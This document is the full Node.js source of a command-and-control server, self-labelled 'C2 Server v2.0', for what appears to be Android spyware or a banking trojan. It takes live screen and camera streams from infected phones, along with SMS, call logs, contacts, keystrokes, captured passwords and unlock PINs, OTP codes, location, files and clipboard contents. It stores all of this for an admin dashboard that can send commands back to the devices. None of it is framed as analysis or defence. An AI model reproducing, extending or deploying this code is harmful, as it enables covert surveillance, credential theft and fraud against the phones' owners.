'use strict';

/**
 * Flash Dashboard — C2 Server v2.0
 *
 * Architecture:
 *   Port 3000  — HTTP (dashboard) + WebSocket upgrade
 *   /ws/device — APK devices connect here (binary frames + JSON)
 *   /ws/admin  — Browser dashboard connects here
 *
 * Binary frame protocol (APK → server):
 *   [0x01][4-byte size BE][JPEG data]  → screen_frame
 *   [0x02][4-byte size BE][JPEG data]  → camera_frame
 *
 * JSON protocol (bidirectional):
 *   { type: "device_info", ... }
 *   { type: "sms", sms: [...] }
 *   { type: "calls", calls: [...] }
 *   { type: "contacts", contacts: [...] }
 *   { type: "keylog", text, pkg, app, is_password, ts }
 *   { type: "notification", title, body, pkg, is_otp, otp_code }
 *   { type: "unlock", status, pin }
 *   { type: "location", lat, lng, accuracy, altitude, speed, provider, address }
 *   { type: "accounts", accounts: [...] }
 *   { type: "file", path, name, size, data_base64 }
 *   { type: "clipboard", text }
 *   { type: "radar_layout", nodes: [...] }
 */

const express  = require('express');
const http     = require('http');
const { WebSocketServer, WebSocket } = require('ws');
const { Pool } = require('pg');
const path     = require('path');
const { v4: uuidv4 } = require('uuid');
const url      = require('url');

// ─── Config ──────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
const DB_URL = process.env.DATABASE_URL || 'postgresql://postgres:postgres@localhost:5432/flash';

// ─── Database ─────────────────────────────────────────────────────────────────
const db = new Pool({ connectionString: DB_URL, max: 20 });

db.connect().then(c => {
  console.log('[DB] Connected to PostgreSQL');
  c.release();
}).catch(err => {
  console.error('[DB] Connection failed:', err.message);
  console.warn('[DB] Running without persistence — data will be in-memory only');
});

async function dbRun(sql, params = []) {
  try {
    return await db.query(sql, params);
  } catch (e) {
    // Silently continue if DB is not available
    return null;
  }
}

// ─── In-memory state ──────────────────────────────────────────────────────────
// devices: Map<device_id, { ws, info, screenFps, pingMs, ... }>
const devices   = new Map();
// admins: Set of admin WebSocket connections
const admins    = new Set();
// per-device last radar layout
const radarCache = new Map();

// ─── Express App ──────────────────────────────────────────────────────────────
const app = express();
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// ─── REST API ─────────────────────────────────────────────────────────────────

// Device list
app.get('/api/devices', async (req, res) => {
  const rows = await dbRun('SELECT * FROM devices ORDER BY last_seen DESC');
  const dbDevices = rows ? rows.rows : [];

  // Merge with live state
  const result = dbDevices.map(d => ({
    ...d,
    online: devices.has(d.device_id),
    ping_ms: devices.get(d.device_id)?.pingMs ?? null,
    screen_fps: devices.get(d.device_id)?.screenFps ?? 0,
  }));

  // Add any online devices not yet in DB
  for (const [id, state] of devices) {
    if (!result.find(d => d.device_id === id)) {
      result.unshift({ ...state.info, online: true, ping_ms: state.pingMs, screen_fps: state.screenFps });
    }
  }

  res.json(result);
});

// SMS
app.get('/api/devices/:id/sms', async (req, res) => {
  const rows = await dbRun(
    'SELECT * FROM sms WHERE device_id=$1 ORDER BY sms_date DESC LIMIT 500',
    [req.params.id]
  );
  res.json(rows ? rows.rows : []);
});

// Calls
app.get('/api/devices/:id/calls', async (req, res) => {
  const rows = await dbRun(
    'SELECT * FROM calls WHERE device_id=$1 ORDER BY call_date DESC LIMIT 500',
    [req.params.id]
  );
  res.json(rows ? rows.rows : []);
});

// Contacts
app.get('/api/devices/:id/contacts', async (req, res) => {
  const rows = await dbRun(
    'SELECT * FROM contacts WHERE device_id=$1 ORDER BY name ASC LIMIT 2000',
    [req.params.id]
  );
  res.json(rows ? rows.rows : []);
});

// Keylog
app.get('/api/devices/:id/keylog', async (req, res) => {
  const rows = await dbRun(
    'SELECT * FROM keylog WHERE device_id=$1 ORDER BY received_at DESC LIMIT 1000',
    [req.params.id]
  );
  res.json(rows ? rows.rows : []);
});

// Passwords
app.get('/api/devices/:id/passwords', async (req, res) => {
  const rows = await dbRun(
    'SELECT * FROM passwords WHERE device_id=$1 ORDER BY captured_at DESC',
    [req.params.id]
  );
  res.json(rows ? rows.rows : []);
});

// Mark password confirmed
app.post('/api/devices/:id/passwords/:pid/confirm', async (req, res) => {
  await dbRun('UPDATE passwords SET confirmed=TRUE WHERE id=$1 AND device_id=$2', [req.params.pid, req.params.id]);
  res.json({ ok: true });
});

// Notifications
app.get('/api/devices/:id/notifications', async (req, res) => {
  const rows = await dbRun(
    'SELECT * FROM notifications WHERE device_id=$1 ORDER BY received_at DESC LIMIT 500',
    [req.params.id]
  );
  res.json(rows ? rows.rows : []);
});

// Locations
app.get('/api/devices/:id/locations', async (req, res) => {
  const rows = await dbRun(
    'SELECT * FROM locations WHERE device_id=$1 ORDER BY received_at DESC LIMIT 200',
    [req.params.id]
  );
  res.json(rows ? rows.rows : []);
});

// Files
app.get('/api/devices/:id/files', async (req, res) => {
  const rows = await dbRun(
    'SELECT id, device_id, path, name, size, mime_type, received_at FROM files WHERE device_id=$1 ORDER BY received_at DESC',
    [req.params.id]
  );
  res.json(rows ? rows.rows : []);
});

// File download
app.get('/api/files/:fid/download', async (req, res) => {
  const rows = await dbRun('SELECT * FROM files WHERE id=$1', [req.params.fid]);
  if (!rows || !rows.rows[0]) return res.status(404).json({ error: 'Not found' });
  const file = rows.rows[0];
  res.setHeader('Content-Disposition', `attachment; filename="${file.name}"`);
  res.setHeader('Content-Type', file.mime_type || 'application/octet-stream');
  res.send(file.data);
});

// Command endpoint (alternative to WS for simple cmds)
app.post('/api/devices/:id/cmd', (req, res) => {
  const deviceState = devices.get(req.params.id);
  if (!deviceState) return res.status(404).json({ error: 'Device offline' });
  sendToDevice(req.params.id, req.body);
  res.json({ ok: true });
});

// Update device alias/notes/tags
app.patch('/api/devices/:id', async (req, res) => {
  const { alias, notes, tags } = req.body;
  await dbRun(
    'UPDATE devices SET alias=COALESCE($1,alias), notes=COALESCE($2,notes), tags=COALESCE($3,tags) WHERE device_id=$4',
    [alias, notes, tags, req.params.id]
  );
  res.json({ ok: true });
});

// Delete device
app.delete('/api/devices/:id', async (req, res) => {
  await dbRun('DELETE FROM devices WHERE device_id=$1', [req.params.id]);
  res.json({ ok: true });
});

// Stats summary
app.get('/api/stats', async (req, res) => {
  const online = devices.size;
  const total = await dbRun('SELECT COUNT(*) FROM devices');
  const passwords = await dbRun('SELECT COUNT(*) FROM passwords');
  const smsCount = await dbRun('SELECT COUNT(*) FROM sms');
  const otps = await dbRun('SELECT COUNT(*) FROM notifications WHERE is_otp=TRUE');
  res.json({
    online,
    total_devices: total?.rows[0]?.count ?? online,
    total_passwords: passwords?.rows[0]?.count ?? 0,
    total_sms: smsCount?.rows[0]?.count ?? 0,
    total_otps: otps?.rows[0]?.count ?? 0,
  });
});

// ─── HTTP Server ──────────────────────────────────────────────────────────────
const server = http.createServer(app);

// ─── WebSocket Servers ────────────────────────────────────────────────────────
const wssDevice = new WebSocketServer({ noServer: true });
const wssAdmin  = new WebSocketServer({ noServer: true });

// Route upgrades by path
// APK default SERVER_URL is wss://host:3000 (no path), so '/' also routes to device handler
server.on('upgrade', (req, socket, head) => {
  const { pathname } = url.parse(req.url);
  if (pathname === '/ws/device' || pathname === '/') {
    wssDevice.handleUpgrade(req, socket, head, ws => wssDevice.emit('connection', ws, req));
  } else if (pathname === '/ws/admin') {
    wssAdmin.handleUpgrade(req, socket, head, ws => wssAdmin.emit('connection', ws, req));
  } else {
    socket.destroy();
  }
});

// ─── Helpers ──────────────────────────────────────────────────────────────────
function broadcastToAdmins(data) {
  const str = typeof data === 'string' ? data : JSON.stringify(data);
  for (const admin of admins) {
    if (admin.readyState === WebSocket.OPEN) {
      admin.send(str);
    }
  }
}

function broadcastBinaryToAdmins(deviceId, buffer) {
  // Prepend device_id length + device_id to binary frame so admin knows which device
  const idBuf = Buffer.from(deviceId, 'utf8');
  const header = Buffer.alloc(2 + idBuf.length);
  header.writeUInt16BE(idBuf.length, 0);
  idBuf.copy(header, 2);
  const full = Buffer.concat([header, buffer]);
  for (const admin of admins) {
    if (admin.readyState === WebSocket.OPEN) {
      admin.send(full);
    }
  }
}

function sendToDevice(deviceId, payload) {
  const state = devices.get(deviceId);
  if (!state || state.ws.readyState !== WebSocket.OPEN) return false;
  state.ws.send(JSON.stringify(payload));
  dbRun(
    'INSERT INTO command_log(device_id,command,payload) VALUES($1,$2,$3)',
    [deviceId, payload.type || payload.action || 'cmd', JSON.stringify(payload)]
  );
  return true;
}

// ─── Device WebSocket Handler ─────────────────────────────────────────────────
wssDevice.on('connection', (ws, req) => {
  const remoteIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  let deviceId = null;
  let pingInterval = null;
  let lastPingTs = 0;
  let frameCount = 0;
  let fpsInterval = null;

  console.log(`[Device] New connection from ${remoteIp}`);

  ws.on('message', async (data, isBinary) => {
    if (isBinary) {
      // ── Binary frame ──────────────────────────────────────────────────────
      if (data.length < 5) return;
      const frameType = data[0];
      const size = data.readUInt32BE(1);
      const payload = data.slice(5, 5 + size);

      if (frameType === 0x01 || frameType === 0x02) {
        // Screen frame or camera frame
        frameCount++;
        if (deviceId) {
          // Forward to admins watching this device
          broadcastBinaryToAdmins(deviceId, data);
        }
      }
      return;
    }

    // ── JSON message ──────────────────────────────────────────────────────
    let msg;
    try { msg = JSON.parse(data); }
    catch (e) { return; }

    // Handle pong
    if (msg.type === 'pong') {
      const latency = Date.now() - lastPingTs;
      if (deviceId && devices.has(deviceId)) {
        devices.get(deviceId).pingMs = latency;
      }
      broadcastToAdmins({ type: 'ping_update', device_id: deviceId, ping_ms: latency });
      return;
    }

    switch (msg.type) {

      // ── Device registration ────────────────────────────────────────────
      case 'device_info': {
        deviceId = msg.device_id || msg.id || uuidv4();

        const info = {
          device_id:        deviceId,
          model:            msg.model || 'Unknown',
          brand:            msg.brand || '',
          android_version:  msg.android_version || msg.android || '',
          sdk_int:          msg.sdk_int || 0,
          battery:          msg.battery || 0,
          is_charging:      msg.is_charging || false,
          has_accessibility: msg.has_accessibility || false,
          has_overlay:      msg.has_overlay || false,
          has_admin:        msg.has_admin || false,
          screen_width:     msg.screen_width || 1080,
          screen_height:    msg.screen_height || 1920,
          carrier:          msg.carrier || '',
          phone_number:     msg.phone_number || '',
          imei:             msg.imei || '',
          country:          msg.country || '',
          ip_address:       remoteIp,
          online:           true,
          last_seen:        new Date().toISOString(),
        };

        devices.set(deviceId, {
          ws,
          info,
          pingMs: 0,
          screenFps: 0,
          _frameCountRef: { v: 0 },
        });

        // Upsert in DB
        await dbRun(`
          INSERT INTO devices (device_id, model, brand, android_version, sdk_int, battery,
            is_charging, has_accessibility, has_overlay, has_admin, screen_width, screen_height,
            carrier, phone_number, imei, country, ip_address, online, last_seen)
          VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,TRUE,NOW())
          ON CONFLICT (device_id) DO UPDATE SET
            model=EXCLUDED.model, brand=EXCLUDED.brand, android_version=EXCLUDED.android_version,
            battery=EXCLUDED.battery, is_charging=EXCLUDED.is_charging,
            has_accessibility=EXCLUDED.has_accessibility, has_overlay=EXCLUDED.has_overlay,
            has_admin=EXCLUDED.has_admin, screen_width=EXCLUDED.screen_width,
            screen_height=EXCLUDED.screen_height, carrier=EXCLUDED.carrier,
            ip_address=EXCLUDED.ip_address, online=TRUE, last_seen=NOW()
        `, [deviceId, info.model, info.brand, info.android_version, info.sdk_int,
            info.battery, info.is_charging, info.has_accessibility, info.has_overlay,
            info.has_admin, info.screen_width, info.screen_height, info.carrier,
            info.phone_number, info.imei, info.country, remoteIp]);

        // Start ping + fps tracking
        pingInterval = setInterval(() => {
          if (ws.readyState === WebSocket.OPEN) {
            lastPingTs = Date.now();
            ws.send(JSON.stringify({ type: 'ping', ts: lastPingTs }));
          }
        }, 3000);

        fpsInterval = setInterval(() => {
          if (!deviceId || !devices.has(deviceId)) return;
          const state = devices.get(deviceId);
          state.screenFps = frameCount;
          frameCount = 0;
          broadcastToAdmins({ type: 'fps_update', device_id: deviceId, fps: state.screenFps });
        }, 1000);

        broadcastToAdmins({ type: 'device_online', device: info });
        console.log(`[Device] Registered: ${info.brand} ${info.model} (${deviceId})`);
        break;
      }

      // ── SMS ───────────────────────────────────────────────────────────
      case 'sms': {
        if (!deviceId) break;
        const smsList = msg.sms || msg.data || [];
        for (const s of smsList) {
          await dbRun(`
            INSERT INTO sms(device_id,sms_id,address,body,sms_date,sms_type,is_read)
            VALUES($1,$2,$3,$4,$5,$6,$7)
            ON CONFLICT(device_id,sms_id) DO UPDATE SET body=EXCLUDED.body, is_read=EXCLUDED.is_read
          `, [deviceId, String(s.id||s.sms_id||''), s.address||'', s.body||'',
              s.date||s.sms_date||0, s.type||s.sms_type||1, s.read||s.is_read||false]);
        }
        broadcastToAdmins({ type: 'sms', device_id: deviceId, sms: smsList });
        break;
      }

      // ── Calls ─────────────────────────────────────────────────────────
      case 'calls': {
        if (!deviceId) break;
        const callList = msg.calls || msg.data || [];
        for (const c of callList) {
          await dbRun(`
            INSERT INTO calls(device_id,call_id,number,name,duration,call_date,call_type)
            VALUES($1,$2,$3,$4,$5,$6,$7)
            ON CONFLICT(device_id,call_id) DO NOTHING
          `, [deviceId, String(c.id||c.call_id||''), c.number||'', c.name||'',
              c.duration||0, c.date||c.call_date||0, c.type||c.call_type||1]);
        }
        broadcastToAdmins({ type: 'calls', device_id: deviceId, calls: callList });
        break;
      }

      // ── Contacts ──────────────────────────────────────────────────────
      case 'contacts': {
        if (!deviceId) break;
        const contactList = msg.contacts || msg.data || [];
        for (const c of contactList) {
          await dbRun(`
            INSERT INTO contacts(device_id,contact_id,name,phone,email)
            VALUES($1,$2,$3,$4,$5)
            ON CONFLICT(device_id,contact_id) DO UPDATE SET name=EXCLUDED.name, phone=EXCLUDED.phone, email=EXCLUDED.email
          `, [deviceId, String(c.id||c.contact_id||''), c.name||'', c.phone||'', c.email||'']);
        }
        broadcastToAdmins({ type: 'contacts', device_id: deviceId, contacts: contactList });
        break;
      }

      // ── Keylog ────────────────────────────────────────────────────────
      case 'keylog': {
        if (!deviceId) break;
        await dbRun(`
          INSERT INTO keylog(device_id,app_name,pkg,text,is_password,event_type,ts)
          VALUES($1,$2,$3,$4,$5,$6,$7)
        `, [deviceId, msg.app||msg.app_name||'', msg.pkg||'', msg.text||'',
            msg.is_password||false, msg.event_type||'', msg.ts||Date.now()]);

        // If it looks like a password field, also save to passwords table
        if (msg.is_password && msg.text && msg.text.length >= 4) {
          const method = /^\d{4,8}$/.test(msg.text) ? 'pin' : 'password';
          await dbRun(`
            INSERT INTO passwords(device_id,method,value,app_context)
            VALUES($1,$2,$3,$4)
          `, [deviceId, method, msg.text, msg.pkg || msg.app || '']);
          broadcastToAdmins({ type: 'new_password', device_id: deviceId, method, value: msg.text, app: msg.pkg });
        }
        broadcastToAdmins({ type: 'keylog', device_id: deviceId, ...msg });
        break;
      }

      // ── Unlock / PIN capture ─────────────────────────────────────────
      case 'unlock': {
        if (!deviceId) break;
        const pin = msg.pin || msg.value || '';
        const method = msg.method || (/^\d+$/.test(pin) ? 'pin' : 'pattern');
        if (pin) {
          await dbRun(`
            INSERT INTO passwords(device_id,method,value,app_context,confidence)
            VALUES($1,$2,$3,'device_unlock',100)
          `, [deviceId, method, pin]);
          broadcastToAdmins({ type: 'new_password', device_id: deviceId, method, value: pin, app: 'device_unlock', confidence: 100 });
        }
        broadcastToAdmins({ type: 'unlock', device_id: deviceId, ...msg });
        break;
      }

      // ── Notification ──────────────────────────────────────────────────
      case 'notification': {
        if (!deviceId) break;
        await dbRun(`
          INSERT INTO notifications(device_id,pkg,title,body,is_otp,otp_code,post_time)
          VALUES($1,$2,$3,$4,$5,$6,$7)
        `, [deviceId, msg.pkg||msg.package||'', msg.title||'', msg.body||'',
            msg.is_otp||false, msg.otp_code||'', msg.post_time||Date.now()]);
        broadcastToAdmins({ type: 'notification', device_id: deviceId, ...msg });
        break;
      }

      // ── Location ──────────────────────────────────────────────────────
      case 'location': {
        if (!deviceId) break;
        await dbRun(`
          INSERT INTO locations(device_id,lat,lng,accuracy,altitude,speed,provider,address)
          VALUES($1,$2,$3,$4,$5,$6,$7,$8)
        `, [deviceId, msg.lat||0, msg.lng||0, msg.accuracy||0,
            msg.altitude||0, msg.speed||0, msg.provider||'', msg.address||'']);
        broadcastToAdmins({ type: 'location', device_id: deviceId, ...msg });
        break;
      }

      // ── Accounts ──────────────────────────────────────────────────────
      case 'accounts': {
        if (!deviceId) break;
        const accList = msg.accounts || msg.data || [];
        for (const a of accList) {
          await dbRun(
            'INSERT INTO accounts(device_id,account_name,account_type) VALUES($1,$2,$3)',
            [deviceId, a.name||a.account_name||'', a.type||a.account_type||'']
          );
        }
        broadcastToAdmins({ type: 'accounts', device_id: deviceId, accounts: accList });
        break;
      }

      // ── File ──────────────────────────────────────────────────────────
      case 'file': {
        if (!deviceId || !msg.data_base64) break;
        const fileData = Buffer.from(msg.data_base64, 'base64');
        await dbRun(`
          INSERT INTO files(device_id,path,name,size,mime_type,data)
          VALUES($1,$2,$3,$4,$5,$6)
        `, [deviceId, msg.path||'', msg.name||'file', fileData.length, msg.mime_type||'application/octet-stream', fileData]);
        broadcastToAdmins({ type: 'file', device_id: deviceId, path: msg.path, name: msg.name, size: fileData.length });
        break;
      }

      // ── Radar/Accessibility Layout ────────────────────────────────────
      case 'radar_layout': {
        if (!deviceId) break;
        radarCache.set(deviceId, msg.nodes || []);
        broadcastToAdmins({ type: 'radar_layout', device_id: deviceId, nodes: msg.nodes || [] });
        break;
      }

      // ── Clipboard ─────────────────────────────────────────────────────
      case 'clipboard': {
        if (!deviceId) break;
        broadcastToAdmins({ type: 'clipboard', device_id: deviceId, text: msg.text });
        break;
      }

      // ── Battery update ────────────────────────────────────────────────
      case 'battery': {
        if (!deviceId) break;
        await dbRun('UPDATE devices SET battery=$1, is_charging=$2 WHERE device_id=$3',
          [msg.level||0, msg.charging||false, deviceId]);
        broadcastToAdmins({ type: 'battery', device_id: deviceId, level: msg.level, charging: msg.charging });
        break;
      }
    }
  });

  ws.on('close', async () => {
    clearInterval(pingInterval);
    clearInterval(fpsInterval);
    if (deviceId) {
      devices.delete(deviceId);
      await dbRun('UPDATE devices SET online=FALSE, last_seen=NOW() WHERE device_id=$1', [deviceId]);
      broadcastToAdmins({ type: 'device_offline', device_id: deviceId });
      console.log(`[Device] Disconnected: ${deviceId}`);
    }
  });

  ws.on('error', err => {
    console.error(`[Device] WS error (${deviceId}):`, err.message);
  });
});

// ─── Admin WebSocket Handler ──────────────────────────────────────────────────
wssAdmin.on('connection', (ws, req) => {
  admins.add(ws);
  console.log(`[Admin] Dashboard connected. Total admins: ${admins.size}`);

  // Send current device list immediately
  const online = [];
  for (const [id, state] of devices) {
    online.push({ ...state.info, online: true, ping_ms: state.pingMs, screen_fps: state.screenFps });
  }
  ws.send(JSON.stringify({ type: 'init', devices: online }));

  ws.on('message', (data, isBinary) => {
    if (isBinary) return;
    let msg;
    try { msg = JSON.parse(data); } catch { return; }

    // Admin → device relay
    if (msg.target_device) {
      sendToDevice(msg.target_device, msg);
      return;
    }

    // Admin requests radar cache
    if (msg.type === 'get_radar' && msg.device_id) {
      const nodes = radarCache.get(msg.device_id) || [];
      ws.send(JSON.stringify({ type: 'radar_layout', device_id: msg.device_id, nodes }));
      return;
    }

    // Admin requests device list refresh
    if (msg.type === 'get_devices') {
      const list = [];
      for (const [id, state] of devices) {
        list.push({ ...state.info, online: true, ping_ms: state.pingMs, screen_fps: state.screenFps });
      }
      ws.send(JSON.stringify({ type: 'init', devices: list }));
      return;
    }
  });

  ws.on('close', () => {
    admins.delete(ws);
    console.log(`[Admin] Dashboard disconnected. Total admins: ${admins.size}`);
  });

  ws.on('error', err => console.error('[Admin] WS error:', err.message));
});

// ─── Start ────────────────────────────────────────────────────────────────────
server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n╔══════════════════════════════════════╗`);
  console.log(`║   Flash Dashboard v2.0 — Running     ║`);
  console.log(`╠══════════════════════════════════════╣`);
  console.log(`║  HTTP + Admin WS : http://0.0.0.0:${PORT} ║`);
  console.log(`║  Device WS       : ws://:${PORT}/ws/device ║`);
  console.log(`║  Admin WS        : ws://:${PORT}/ws/admin  ║`);
  console.log(`╚══════════════════════════════════════╝\n`);
});

// Graceful shutdown
process.on('SIGTERM', () => { server.close(); db.end(); });
process.on('SIGINT',  () => { server.close(); db.end(); process.exit(0); });
